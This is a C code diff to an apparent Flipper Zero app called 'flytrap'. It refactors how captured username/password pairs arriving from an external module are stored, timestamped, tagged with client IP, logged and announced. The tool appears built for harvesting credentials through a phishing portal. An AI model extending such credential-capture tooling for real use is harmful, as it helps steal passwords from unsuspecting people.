@@ -1,5 +1,6 @@
 #include "flytrap_session.h"
 #include "flytrap_storage.h"
+#include "flytrap_format.h"
 #include "../flytrap_i.h"
 
 // Everything here runs on the GUI thread (RX is drained from the global custom
@@ -14,25 +15,22 @@ static void bound_buf(FuriString* s) {
 }
 
 static void notify_capture(FlytrapApp* app) {
-    notification_message(app->notifications, &sequence_single_vibro);
-    notification_message(app->notifications, &sequence_success);
+    if(app->vibro_on) notification_message(app->notifications, &sequence_single_vibro);
+    if(app->sound_on) notification_message(app->notifications, &sequence_success);
 }
 
 static void store_cred(FlytrapApp* app, const char* kv) {
-    // Ring buffer feeds the dashboard's "last capture" line.
-    strncpy(app->captures[app->cap_head].kv, kv, FLYTRAP_CAP_KV_SIZE - 1);
-    app->captures[app->cap_head].kv[FLYTRAP_CAP_KV_SIZE - 1] = '\0';
+    // Store a structured record in the ring (browsed as list -> detail).
+    FlytrapCapture* c = &app->captures[app->cap_head];
+    DateTime dt;
+    furi_hal_rtc_get_datetime(&dt);
+    snprintf(c->when, sizeof(c->when), "%02u:%02u:%02u", dt.hour, dt.minute, dt.second);
+    flytrap_kv_get_ip(kv, c->ip, sizeof(c->ip));
+    strncpy(c->raw, kv, FLYTRAP_CAP_KV_SIZE - 1);
+    c->raw[FLYTRAP_CAP_KV_SIZE - 1] = '\0';
+
     app->cap_head = (app->cap_head + 1) % FLYTRAP_CAP_SLOTS;
     app->cap_count++;
-
-    // Scrollable history, timestamped.
-    FuriString* ts = furi_string_alloc();
-    flytrap_timestamp(ts);
-    furi_string_cat_str(app->session_captures, furi_string_get_cstr(ts));
-    furi_string_cat_str(app->session_captures, kv);
-    furi_string_cat_str(app->session_captures, "\n");
-    furi_string_free(ts);
-    bound_buf(app->session_captures);
 
     flytrap_storage_append_log(app, "cred", kv);
     notify_capture(app);
@@ -74,10 +72,17 @@ static void process_line(FlytrapApp* app, const char* line) {
     } else if(strncmp(line, "u: ", 3) == 0) {
         furi_string_set(app->legacy_user, line + 3);
     } else if(strncmp(line, "p: ", 3) == 0) {
+        // Escape the legacy fields so a value containing &/= can't forge structure.
+        FuriString* eu = furi_string_alloc();
+        FuriString* ep = furi_string_alloc();
+        flytrap_url_encode(furi_string_get_cstr(app->legacy_user), eu);
+        flytrap_url_encode(line + 3, ep);
         FuriString* kv = furi_string_alloc();
-        furi_string_printf(kv, "u=%s&p=%s", furi_string_get_cstr(app->legacy_user), line + 3);
+        furi_string_printf(kv, "u=%s&p=%s", furi_string_get_cstr(eu), furi_string_get_cstr(ep));
         store_cred(app, furi_string_get_cstr(kv));
         furi_string_free(kv);
+        furi_string_free(eu);
+        furi_string_free(ep);
     }
 }
 
@@ -135,7 +140,6 @@ void flytrap_session_start(FlytrapApp* app) {
     furi_string_set(app->status, "starting");
     furi_string_reset(app->line_acc);
     furi_string_reset(app->legacy_user);
-    furi_string_reset(app->session_captures);
     furi_string_reset(app->session_raw);
 
     flytrap_storage_new_log(app);
